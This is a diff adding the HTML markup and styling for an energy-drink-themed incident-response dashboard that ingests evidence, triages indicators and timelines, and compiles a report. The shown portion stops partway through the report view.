@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MONSTER // IR-OPS — Beast-Mode Evidence-to-Report Engine</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts: Chakra Petch (Display), Inter (UI), JetBrains Mono (Logs/Hashes) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:ital,wght@0,500;0,600;0,700;1,700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            monster: {
+              black: '#050505',
+              charcoal: '#0d0e0d',
+              panel: '#121412',
+              border: '#1f261e',
+              neon: '#95D600',
+              acid: '#39FF14',
+              darkGreen: '#192b05',
+              danger: '#ff2a5f',
+              amber: '#ffb800',
+            }
+          },
+          fontFamily: {
+            display: ['"Chakra Petch"', 'sans-serif'],
+            sans: ['Inter', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace'],
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    /* Custom Cyber / Monster Energy Aesthetics */
+    :root {
+      --neon: #95D600;
+      --acid: #39FF14;
+      --bg-void: #050505;
+    }
+
+    body {
+      background-color: #050505;
+      color: #e4e8e3;
+      background-image:
+        radial-gradient(circle at 15% 15%, rgba(149, 214, 0, 0.06) 0%, transparent 38%),
+        radial-gradient(circle at 85% 80%, rgba(57, 255, 20, 0.04) 0%, transparent 40%),
+        linear-gradient(rgba(149, 214, 0, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(149, 214, 0, 0.03) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
+      overflow-x: hidden;
+    }
+
+    /* Jagged Claw-Clipped Corners */
+    .claw-card {
+      background: linear-gradient(165deg, #111411 0%, #0a0b0a 100%);
+      border: 1px solid #222b20;
+      position: relative;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    .claw-card:hover {
+      border-color: rgba(149, 214, 0, 0.45);
+      box-shadow: 0 0 24px rgba(149, 214, 0, 0.08);
+    }
+
+    .neon-glow {
+      box-shadow: 0 0 15px rgba(149, 214, 0, 0.35), inset 0 0 8px rgba(149, 214, 0, 0.15);
+    }
+
+    .neon-text-glow {
+      text-shadow: 0 0 12px rgba(149, 214, 0, 0.55);
+    }
+
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 7px;
+      height: 7px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #080908;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #273324;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #95D600;
+    }
+
+    /* Scanline Pulse Animation for Parser */
+    @keyframes scanPulse {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .energy-bar {
+      background: linear-gradient(90deg, #5e8a00, #95D600, #39FF14, #95D600);
+      background-size: 200% 200%;
+      animation: scanPulse 1.6s ease infinite;
+    }
+
+    /* Print Styles for Clean Formal Report Export */
+    @media print {
+      body {
+        background: #ffffff !important;
+        color: #111827 !important;
+        background-image: none !important;
+      }
+      .no-print {
+        display: none !important;
+      }
+      #view-report {
+        display: block !important;
+        padding: 0 !important;
+        margin: 0 !important;
+      }
+      .print-paper {
+        background: #ffffff !important;
+        color: #111827 !important;
+        border: none !important;
+        box-shadow: none !important;
+        padding: 0 !important;
+      }
+      .print-paper * {
+        color: #111827 !important;
+        border-color: #d1d5db !important;
+        background: transparent !important;
+        text-shadow: none !important;
+        box-shadow: none !important;
+      }
+      .print-badge {
+        border: 1px solid #374151 !important;
+        padding: 2px 6px !important;
+      }
+    }
+  </style>
+</head>
+<body class="font-sans antialiased min-h-screen flex flex-col selection:bg-[#95D600] selection:text-black">
+
+  <!-- Toast Notification Container (Replaces alert) -->
+  <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none no-print"></div>
+
+  <!-- Background Watermark Claw SVG -->
+  <svg class="fixed -right-20 top-24 w-[460px] h-[460px] text-[#95D600]/[0.035] pointer-events-none select-none z-0 no-print" viewBox="0 0 200 200" fill="currentColor">
+    <!-- Three jagged iconic claw slashes -->
+    <path d="M42 15 L64 25 L54 75 L67 125 L50 185 L37 175 L48 122 L36 74 Z" />
+    <path d="M92 8 L116 20 L104 78 L119 132 L100 194 L85 182 L99 130 L85 75 Z" />
+    <path d="M142 18 L164 30 L152 80 L165 128 L148 182 L134 172 L146 125 L134 78 Z" />
+  </svg>
+
+  <!-- TOP TACTICAL NAVBAR -->
+  <header class="sticky top-0 z-40 bg-[#070807]/95 backdrop-blur-md border-b border-[#222c20] no-print">
+    <!-- Top Telemetry Micro-Banner -->
+    <div class="bg-[#0e130c] border-b border-[#1c261a] px-4 py-1.5 text-[11px] font-mono flex flex-wrap items-center justify-between gap-2 text-zinc-400">
+      <div class="flex items-center gap-3">
+        <span class="inline-flex items-center gap-1.5 text-[#95D600] font-bold">
+          <span class="w-2 h-2 rounded-full bg-[#39FF14] animate-ping"></span>
+          THREAT LEVEL: UNLEASHED
+        </span>
+        <span class="hidden sm:inline text-zinc-600">|</span>
+        <span class="hidden sm:inline">CAFFEINE OVERDRIVE: <strong class="text-[#95D600]">100%</strong></span>
+        <span class="hidden md:inline text-zinc-600">|</span>
+        <span class="hidden md:inline text-zinc-400">FORMULA: <span class="text-white">ZERO-DAY SUGAR FREE</span></span>
+      </div>
+      <div class="flex items-center gap-3">
+        <span id="nav-incident-badge" class="text-[#95D600] font-semibold">CASE: IR-2026-0894-BEAST</span>
+        <button onclick="resetToDemoScenario()" class="text-xs px-2 py-0.5 rounded bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 text-zinc-300 hover:text-[#95D600] transition cursor-pointer" title="Reset pre-loaded ransomware scenario">
+          ↻ RESET SCENARIO
+        </button>
+      </div>
+    </div>
+
+    <!-- Main Navigation Bar -->
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 py-3 flex flex-col lg:flex-row items-center justify-between gap-3">
+      <!-- Brand Logo -->
+      <div class="flex items-center gap-3 w-full lg:w-auto justify-between">
+        <div class="flex items-center gap-3">
+          <!-- Custom Jagged Claw Emblem -->
+          <div class="w-10 h-10 rounded-lg bg-[#0e140c] border border-[#95D600]/60 flex items-center justify-center neon-glow shrink-0">
+            <svg class="w-7 h-7 text-[#95D600]" viewBox="0 0 100 100" fill="currentColor">
+              <path d="M20 8 L33 14 L27 42 L35 68 L25 94 L17 88 L24 65 L17 40 Z" />
+              <path d="M46 4 L60 11 L53 43 L62 72 L50 97 L41 91 L50 70 L42 41 Z" />
+              <path d="M72 10 L85 17 L78 44 L86 70 L76 92 L68 86 L75 68 L68 42 Z" />
+            </svg>
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="font-display font-bold text-xl sm:text-2xl tracking-wider text-white uppercase">
+                MONSTER <span class="text-[#95D600] neon-text-glow">// IR-OPS</span>
+              </span>
+              <span class="text-[10px] font-mono font-bold uppercase px-1.5 py-0.5 rounded bg-[#95D600]/15 text-[#95D600] border border-[#95D600]/40">
+                V4.2 NITRO
+              </span>
+            </div>
+            <p class="text-[11px] font-mono text-zinc-400 tracking-wide">BEAST-MODE SOC: EVIDENCE-TO-REPORT ENGINE</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 3-Stage Tactical View Switcher -->
+      <nav class="flex items-center gap-1.5 sm:gap-2 w-full lg:w-auto overflow-x-auto pb-1 lg:pb-0">
+        <button id="tab-ingest" onclick="switchView('ingest')" class="nav-tab flex-1 lg:flex-initial px-3.5 py-2.5 rounded-lg font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center gap-2 transition cursor-pointer border">
+          <span class="font-mono text-xs opacity-75">01</span>
+          <span>INGEST // LOCKER</span>
+          <span id="badge-artifact-count" class="ml-1 px-1.5 py-0.2 text-[11px] font-mono rounded bg-black/50 text-[#95D600] border border-[#95D600]/40">3</span>
+        </button>
+
+        <span class="text-zinc-600 font-mono hidden sm:inline">»</span>
+
+        <button id="tab-triage" onclick="switchView('triage')" class="nav-tab flex-1 lg:flex-initial px-3.5 py-2.5 rounded-lg font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center gap-2 transition cursor-pointer border">
+          <span class="font-mono text-xs opacity-75">02</span>
+          <span>TRIAGE // MATRIX</span>
+          <span id="badge-ioc-count" class="ml-1 px-1.5 py-0.2 text-[11px] font-mono rounded bg-black/50 text-[#95D600] border border-[#95D600]/40">8</span>
+        </button>
+
+        <span class="text-zinc-600 font-mono hidden sm:inline">»</span>
+
+        <button id="tab-report" onclick="switchView('report')" class="nav-tab flex-1 lg:flex-initial px-3.5 py-2.5 rounded-lg font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center gap-2 transition cursor-pointer border">
+          <span class="font-mono text-xs opacity-75">03</span>
+          <span>REPORT // DOSSIER</span>
+        </button>
+      </nav>
+    </div>
+
+    <!-- Jagged Slash SVG Divider -->
+    <div class="w-full h-1.5 overflow-hidden bg-[#050505]">
+      <svg class="w-full h-full" preserveAspectRatio="none" viewBox="0 0 1200 10">
+        <polygon points="0,0 1200,0 1185,10 920,3 610,10 300,2 15,10" fill="#95D600" fill-opacity="0.7" />
+      </svg>
+    </div>
+  </header>
+
+  <!-- MAIN CONTENT WORKSPACE -->
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 relative z-10">
+
+    <!-- ===================================================================== -->
+    <!-- VIEW 1: INGEST // EVIDENCE LOCKER                                     -->
+    <!-- ===================================================================== -->
+    <section id="view-ingest" class="space-y-6">
+      <!-- Top Header & Quick Telemetry -->
+      <div class="flex flex-col md:flex-row md:items-end justify-between gap-4 border-b border-[#1f261e] pb-4">
+        <div>
+          <div class="inline-flex items-center gap-2 text-xs font-mono text-[#95D600] uppercase tracking-widest mb-1">
+            <span>STAGE 01 // ARTIFACT ACQUISITION</span>
+          </div>
+          <h1 class="font-display font-bold text-2xl sm:text-3xl text-white uppercase tracking-wide">
+            INGEST // <span class="text-[#95D600]">EVIDENCE LOCKER</span>
+          </h1>
+          <p class="text-sm text-zinc-400 mt-1">
+            Drop raw telemetry logs, email headers, or memory dumps—or inject pre-staged attack artifacts to test the automated IOC & timeline extraction engine.
+          </p>
+        </div>
+        <div class="flex flex-wrap items-center gap-2">
+          <button onclick="unleashParser()" id="btn-unleash" class="px-5 py-3 rounded-lg bg-[#95D600] hover:bg-[#a6eb07] text-black font-display font-bold text-sm sm:text-base tracking-wider uppercase flex items-center gap-2 shadow-[0_0_20px_rgba(149,214,0,0.45)] transition transform active:scale-95 cursor-pointer">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z" />
+            </svg>
+            UNLEASH PARSER
+          </button>
+        </div>
+      </div>
+
+      <!-- Ingestion Grid: Left (Dropzone + Sample Injectors + Raw Paste) / Right (Parser Console) -->
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        <!-- Left 7 Cols: Upload & Sample Loaders -->
+        <div class="lg:col-span-7 space-y-5">
+          <!-- Drag & Drop Zone -->
+          <div id="drop-zone" class="claw-card rounded-xl p-6 border-2 border-dashed border-[#2c3b29] hover:border-[#95D600] text-center transition cursor-pointer group">
+            <input type="file" id="file-input" class="hidden" multiple onchange="handleFileSelect(event)" />
+            <div class="w-12 h-12 rounded-xl bg-[#141c12] border border-[#95D600]/40 mx-auto flex items-center justify-center text-[#95D600] group-hover:scale-110 transition mb-3">
+              <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
+              </svg>
+            </div>
+            <h3 class="font-display font-bold text-lg text-white uppercase tracking-wide">
+              DROP RAW EVIDENCE ARTIFACTS HERE
+            </h3>
+            <p class="text-xs text-zinc-400 font-mono mt-1">
+              SUPPORTS .LOG, .JSON, .EVTX, .EML, .TXT, .PS1 — AUTO-HASHED (SHA-256) ON INGEST
+            </p>
+            <button type="button" onclick="document.getElementById('file-input').click()" class="mt-4 px-4 py-2 rounded-lg bg-[#161f14] hover:bg-[#1f2c1c] text-[#95D600] border border-[#95D600]/40 text-xs font-mono font-bold uppercase tracking-wider transition cursor-pointer">
+              + BROWSE LOCAL FILES
+            </button>
+          </div>
+
+          <!-- One-Click Tactical Sample Injectors -->
+          <div class="claw-card rounded-xl p-5">
+            <div class="flex items-center justify-between mb-3">
+              <span class="font-display font-bold text-sm uppercase tracking-wider text-white flex items-center gap-2">
+                <span class="w-2 h-2 bg-[#95D600] rounded-full"></span>
+                INSTANT THREAT SAMPLE INJECTORS
+              </span>
+              <span class="text-[11px] font-mono text-zinc-400">1-CLICK PAYLOADS</span>
+            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
+              <button onclick="injectSampleArtifact('sysmon')" class="p-3 rounded-lg bg-[#0d120c] hover:bg-[#162114] border border-[#253322] hover:border-[#95D600] text-left transition cursor-pointer group">
+                <div class="text-[10px] font-mono text-[#ff2a5f] font-bold uppercase">RANSOMWARE // EVTX</div>
+                <div class="font-display font-bold text-sm text-white group-hover:text-[#95D600] mt-0.5">Load Ransomware Sysmon Log</div>
+                <div class="text-[11px] text-zinc-400 mt-1 font-mono">vssadmin.exe + CobaltStrike</div>
+              </button>
+
+              <button onclick="injectSampleArtifact('phishing')" class="p-3 rounded-lg bg-[#0d120c] hover:bg-[#162114] border border-[#253322] hover:border-[#95D600] text-left transition cursor-pointer group">
+                <div class="text-[10px] font-mono text-[#ffb800] font-bold uppercase">INITIAL ACCESS // EML</div>
+                <div class="font-display font-bold text-sm text-white group-hover:text-[#95D600] mt-0.5">Load Phishing Email Headers</div>
+                <div class="text-[11px] text-zinc-400 mt-1 font-mono">SPF Fail + Spoofed Invoice</div>
+              </button>
+
+              <button onclick="injectSampleArtifact('powershell')" class="p-3 rounded-lg bg-[#0d120c] hover:bg-[#162114] border border-[#253322] hover:border-[#95D600] text-left transition cursor-pointer group">
+                <div class="text-[10px] font-mono text-[#39FF14] font-bold uppercase">EXECUTION // PS1</div>
+                <div class="font-display font-bold text-sm text-white group-hover:text-[#95D600] mt-0.5">Load Suspicious PowerShell Dump</div>
+                <div class="text-[11px] text-zinc-400 mt-1 font-mono">Encoded IEX + C2 Beacon</div>
+              </button>
+            </div>
+          </div>
+
+          <!-- Manual Raw Log / Snippet Paste Box -->
+          <div class="claw-card rounded-xl p-5">
+            <div class="flex items-center justify-between mb-2">
+              <label for="raw-paste-input" class="font-display font-bold text-sm uppercase tracking-wider text-white">
+                PASTE RAW LOG / IOC SNIPPET
+              </label>
+              <input id="raw-paste-name" type="text" placeholder="artifact_snippet.log" class="bg-[#080a08] border border-[#253023] rounded px-2.5 py-1 text-xs font-mono text-zinc-200 focus:outline-none focus:border-[#95D600] w-44" />
+            </div>
+            <textarea id="raw-paste-input" rows="3" placeholder="Paste raw firewall logs, command lines, IPs (e.g. 185.220.101.44), domains, or hashes here..." class="w-full bg-[#070907] border border-[#222b20] rounded-lg p-3 text-xs font-mono text-[#95D600] placeholder-zinc-600 focus:outline-none focus:border-[#95D600]"></textarea>
+            <div class="flex justify-end mt-2.5">
+              <button onclick="ingestPastedText()" class="px-4 py-2 rounded-lg bg-[#182216] hover:bg-[#233320] text-[#95D600] border border-[#95D600]/40 font-display font-bold text-xs uppercase tracking-wider transition cursor-pointer">
+                + ADD SNIPPET TO LOCKER
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right 5 Cols: High-Energy Parser Terminal & Progress -->
+        <div class="lg:col-span-5 flex flex-col">
+          <div class="claw-card rounded-xl p-5 flex-1 flex flex-col justify-between bg-[#080a08]">
+            <div>
+              <div class="flex items-center justify-between border-b border-[#1f261e] pb-3 mb-3">
+                <div class="flex items-center gap-2">
+                  <span class="w-2.5 h-2.5 rounded-full bg-[#ff2a5f]"></span>
+                  <span class="w-2.5 h-2.5 rounded-full bg-[#ffb800]"></span>
+                  <span class="w-2.5 h-2.5 rounded-full bg-[#95D600]"></span>
+                  <span class="font-mono text-xs font-bold text-zinc-300 ml-1">BEAST_PARSER_DAEMON.SH</span>
+                </div>
+                <span id="parser-status-pill" class="text-[10px] font-mono px-2 py-0.5 rounded bg-[#95D600]/15 text-[#95D600] border border-[#95D600]/30">
+                  READY // ARMED
+                </span>
+              </div>
+
+              <!-- Progress Bar -->
+              <div class="mb-3">
+                <div class="flex justify-between text-[11px] font-mono mb-1">
+                  <span class="text-zinc-400">EXTRACTION PIPELINE</span>
+                  <span id="parser-percent" class="text-[#95D600] font-bold">100%</span>
+                </div>
+                <div class="w-full h-2.5 bg-[#121712] rounded-full overflow-hidden border border-[#243022]">
+                  <div id="parser-progress-bar" class="h-full energy-bar transition-all duration-300" style="width: 100%"></div>
+                </div>
+              </div>
+
+              <!-- Live Terminal Output -->
+              <div id="parser-terminal" class="bg-[#040504] border border-[#1a2219] rounded-lg p-3 font-mono text-xs text-zinc-300 h-64 overflow-y-auto space-y-1.5 leading-relaxed">
+                <div class="text-[#95D600]">[SYS] MONSTER // IR-OPS v4.2 Nitro Engine Initialized.</div>
+                <div class="text-zinc-400">[INFO] Pre-loaded Scenario: <span class="text-white">Operation VenomLock (Ransomware Intrusion)</span>.</div>
+                <div class="text-zinc-400">[HASH] Verified 3 forensic artifacts in Evidence Locker.</div>
+                <div class="text-[#39FF14]">[OK] Extracted 8 high-confidence IOCs & 6 chronological timeline events.</div>
+                <div class="text-zinc-500">[TIP] Add new artifacts or click "UNLEASH PARSER" to re-compile Triage & Report.</div>
+              </div>
+            </div>
+
+            <div class="mt-4 pt-3 border-t border-[#1f261e] flex items-center justify-between text-xs font-mono">
+              <span class="text-zinc-400">ENGINE THROUGHPUT: <strong class="text-[#95D600]">1.42 GB/s</strong></span>
+              <button onclick="switchView('triage')" class="text-[#95D600] hover:underline font-bold cursor-pointer">
+                PROCEED TO TRIAGE MATRIX →
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live Evidence Queue Table -->
+      <div class="claw-card rounded-xl overflow-hidden">
+        <div class="px-5 py-4 border-b border-[#1f261e] flex flex-col sm:flex-row sm:items-center justify-between gap-2 bg-[#0d100d]">
+          <div>
+            <h2 class="font-display font-bold text-lg text-white uppercase tracking-wide">
+              INGESTED EVIDENCE QUEUE (<span id="queue-count-label" class="text-[#95D600]">3</span> ARTIFACTS)
+            </h2>
+            <p class="text-xs text-zinc-400 font-mono">Chain-of-custody cryptographic hashes & automated threat classification</p>
+          </div>
+          <button onclick="clearAllArtifacts()" class="self-start sm:self-auto px-3 py-1.5 rounded bg-zinc-900 hover:bg-red-950/50 text-zinc-400 hover:text-[#ff2a5f] border border-zinc-800 hover:border-[#ff2a5f]/50 text-xs font-mono transition cursor-pointer">
+            PURGE LOCKER
+          </button>
+        </div>
+
+        <div class="overflow-x-auto">
+          <table class="w-full text-left border-collapse">
+            <thead>
+              <tr class="border-b border-[#1f261e] bg-[#090b09] text-[11px] font-mono uppercase text-zinc-400">
+                <th class="py-3 px-4">Artifact Filename</th>
+                <th class="py-3 px-4">Telemetry Type</th>
+                <th class="py-3 px-4">SHA-256 Hash Preview</th>
+                <th class="py-3 px-4">Severity</th>
+                <th class="py-3 px-4">Status</th>
+                <th class="py-3 px-4 text-right">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="evidence-table-body" class="divide-y divide-[#181f17] text-sm">
+              <!-- Populated dynamically via JS -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- VIEW 2: TRIAGE // IOC & TIMELINE MATRIX                               -->
+    <!-- ===================================================================== -->
+    <section id="view-triage" class="hidden space-y-6">
+      <!-- Top Header -->
+      <div class="flex flex-col md:flex-row md:items-end justify-between gap-4 border-b border-[#1f261e] pb-4">
+        <div>
+          <div class="inline-flex items-center gap-2 text-xs font-mono text-[#95D600] uppercase tracking-widest mb-1">
+            <span>STAGE 02 // THREAT CORRELATION & ENRICHMENT</span>
+          </div>
+          <h1 class="font-display font-bold text-2xl sm:text-3xl text-white uppercase tracking-wide">
+            TRIAGE // <span class="text-[#95D600]">IOC & TIMELINE MATRIX</span>
+          </h1>
+          <p class="text-sm text-zinc-400 mt-1">
+            Validate extracted Indicators of Compromise, map MITRE ATT&CK techniques, and curate chronological attack events before compiling the executive dossier.
+          </p>
+        </div>
+        <div class="flex items-center gap-2">
+          <button onclick="switchView('report')" class="px-5 py-3 rounded-lg bg-[#95D600] hover:bg-[#a6eb07] text-black font-display font-bold text-sm tracking-wider uppercase flex items-center gap-2 shadow-[0_0_18px_rgba(149,214,0,0.4)] transition cursor-pointer">
+            COMPILE IR DOSSIER →
+          </button>
+        </div>
+      </div>
+
+      <!-- High-Voltage KPI Telemetry Strip -->
+      <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
+        <div class="claw-card rounded-xl p-4">
+          <div class="text-[11px] font-mono text-zinc-400 uppercase">EXTRACTED IOCS</div>
+          <div id="kpi-iocs" class="font-display font-bold text-3xl text-[#95D600] mt-1">8</div>
+          <div class="text-[11px] font-mono text-zinc-500 mt-1">IPs, Hashes, C2 Domains</div>
+        </div>
+        <div class="claw-card rounded-xl p-4">
+          <div class="text-[11px] font-mono text-zinc-400 uppercase">TIMELINE EVENTS</div>
+          <div id="kpi-events" class="font-display font-bold text-3xl text-white mt-1">6 / 6</div>
+          <div class="text-[11px] font-mono text-zinc-500 mt-1">Included in Final Report</div>
+        </div>
+        <div class="claw-card rounded-xl p-4">
+          <div class="text-[11px] font-mono text-zinc-400 uppercase">MITRE TECHNIQUES</div>
+          <div id="kpi-mitre" class="font-display font-bold text-3xl text-[#39FF14] mt-1">5</div>
+          <div class="text-[11px] font-mono text-zinc-500 mt-1">ATT&CK v15 Mapped</div>
+        </div>
+        <div class="claw-card rounded-xl p-4">
+          <div class="text-[11px] font-mono text-zinc-400 uppercase">PEAK SEVERITY</div>
+          <div id="kpi-severity" class="font-display font-bold text-2xl sm:text-3xl text-[#ff2a5f] mt-1">BEAST-TIER</div>
+          <div class="text-[11px] font-mono text-zinc-500 mt-1">Active Ransomware Staging</div>
+        </div>
+      </div>
+
+      <!-- Extracted IOCs Section -->
+      <div class="claw-card rounded-xl overflow-hidden">
+        <div class="px-5 py-4 border-b border-[#1f261e] flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#0d100d]">
+          <div>
+            <h2 class="font-display font-bold text-lg text-white uppercase tracking-wide">
+              EXTRACTED INDICATORS OF COMPROMISE (IOCs)
+            </h2>
+            <p class="text-xs text-zinc-400 font-mono">Click any indicator to copy defanged/raw value or toggle report inclusion</p>
+          </div>
+          <!-- Filter Pills -->
+          <div class="flex flex-wrap gap-1.5 font-mono text-xs">
+            <button onclick="setIocFilter('ALL')" class="ioc-filter-btn px-2.5 py-1 rounded bg-[#95D600] text-black font-bold cursor-pointer" data-filter="ALL">ALL</button>
+            <button onclick="setIocFilter('IP')" class="ioc-filter-btn px-2.5 py-1 rounded bg-zinc-900 text-zinc-300 border border-zinc-700 cursor-pointer" data-filter="IP">IPs</button>
+            <button onclick="setIocFilter('DOMAIN')" class="ioc-filter-btn px-2.5 py-1 rounded bg-zinc-900 text-zinc-300 border border-zinc-700 cursor-pointer" data-filter="DOMAIN">DOMAINS</button>
+            <button onclick="setIocFilter('HASH')" class="ioc-filter-btn px-2.5 py-1 rounded bg-zinc-900 text-zinc-300 border border-zinc-700 cursor-pointer" data-filter="HASH">HASHES</button>
+          </div>
+        </div>
+
+        <div id="ioc-grid" class="p-5 grid grid-cols-1 md:grid-cols-2 gap-3.5">
+          <!-- Populated dynamically via JS -->
+        </div>
+      </div>
+
+      <!-- Interactive Attack Timeline Matrix -->
+      <div class="claw-card rounded-xl p-5">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-[#1f261e] pb-4 mb-5">
+          <div>
+            <h2 class="font-display font-bold text-lg text-white uppercase tracking-wide">
+              CHRONOLOGICAL ATTACK TIMELINE & ANALYST NOTES
+            </h2>
+            <p class="text-xs text-zinc-400 font-mono">Toggle inclusion checkboxes, adjust severity levels, or edit analyst commentary live</p>
+          </div>
+          <button onclick="addCustomTimelineEvent()" class="self-start sm:self-auto px-3 py-1.5 rounded-lg bg-[#162114] hover:bg-[#1f2e1c] text-[#95D600] border border-[#95D600]/40 text-xs font-mono font-bold uppercase cursor-pointer">
+            + ADD TIMELINE EVENT
+          </button>
+        </div>
+
+        <div id="timeline-container" class="space-y-4 relative before:content-[''] before:absolute before:left-4 sm:before:left-6 before:top-2 before:bottom-2 before:w-0.5 before:bg-[#233021]">
+          <!-- Populated dynamically via JS -->
+        </div>
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- VIEW 3: REPORT // EXECUTIVE IR DOSSIER                                -->
+    <!-- ===================================================================== -->
+    <section id="view-report" class="hidden space-y-6">
+      <!-- Action Bar (Hidden when printing) -->
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-[#1f261e] pb-4 no-print">
+        <div>
+          <div class="inline-flex items-center gap-2 text-xs font-mono text-[#95D600] uppercase tracking-widest mb-1">
+            <span>STAGE 03 // FINAL DELIVERABLE</span>
+          </div>
+          <h1 class="font-display font-bold text-2xl sm:text-3xl text-white uppercase tracking-wide">
+            REPORT // <span class="text-[#95D600]">EXECUTIVE IR DOSSIER</span>
+          </h1>
+          <p class="text-sm text-zinc-400 mt-1">
+            Dynamically synthesized from your triaged artifacts, IOCs, and attack timeline. Ready for executive briefing, Markdown export, or PDF print.
+          </p>
+        </div>
+
+        <div class="flex flex-wrap items-center gap-2.5">
+          <button onclick="copyReportMarkdown()" class="px-4 py-2.5 rounded-lg bg-[#151d14] hover:bg-[#1e2b1c] text-[#95D600] border border-[#95D600]/50 font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center gap-2 transition cursor-pointer">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+            </svg>
+            COPY MARKDOWN
+          </button>
+
+          <button onclick="window.print()" class="px-5 py-2.5 rounded-lg bg-[#95D600] hover:bg-[#a6eb07] text-black font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center gap-2 shadow-[0_0_20px_rgba(149,214,0,0.4)] transition cursor-pointer">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z" />
+            </svg>
+            PRINT / EXPORT PDF
+          </button>
+        </div>
+      </div>
+
+      <!-- Formal Dossier Sheet -->
+      <article class="claw-card print-paper rounded-2xl p-6 sm:p-10 space-y-8 bg-[#0b0d0b]">
+        <!-- Dossier Header Banner -->
+        <div class="border-b-2 border-[#95D600] pb-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+          <div>
+            <div class="flex items-center gap-2 text-xs font-mono text-[#95D600] font-bold uppercase tracking-widest">
+              <span>TLP:AMBER+STRICT // CONFIDENTIAL IR BRIEFING</span>
+            </div>
+            <h2 class="font-display font-bold text-2xl sm:text-4xl text-white uppercase tracking-wide mt-1">
+              INCIDENT RESPONSE DOSSIER
+            </h2>
+            <p class="text-xs font-mono text-zinc-400 mt-1">
+              GENERATED BY MONSTER // IR-OPS BEAST-MODE ENGINE
+            </p>
+          </div>
+          <div class="text-left sm:text-right font-mono text-xs space-y-1">
+            <div class="inline-block px-3 py-1 rounded bg-[#ff2a5f]/15 text-[#ff2a5f] border border-[#ff2a5f]/40 font-bold print-badge">
+              SEVERITY: BEAST-TIER (CRITICAL)
+            </div>
+            <div id="report-timestamp" class="text-zinc-400">GENERATED: 2026-11-12 18:32 EST</div>
+          </div>
+        </div>
+
+        <!-- Editable Incident Metadata Grid -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 bg-[#080a08] p-4 rounded-xl border border-[#1f261e]">
+          <div>
+            <label class="block text-[10px] font-mono text-zinc-400 uppercase mb-1">INCIDENT CASE ID</label>
+            <input id="meta-incident-id" type="text" value="IR-2026-0894-BEAST" oninput="syncIncidentBadge(this.value)" class="w-full bg-[#0e120e] border border-[#253023] rounded px-2.5 py-1.5 text-xs font-mono font-bold text-[#95D600] focus:outline-none focus:border-[#95D600]" />
+          </div>
+          <div>
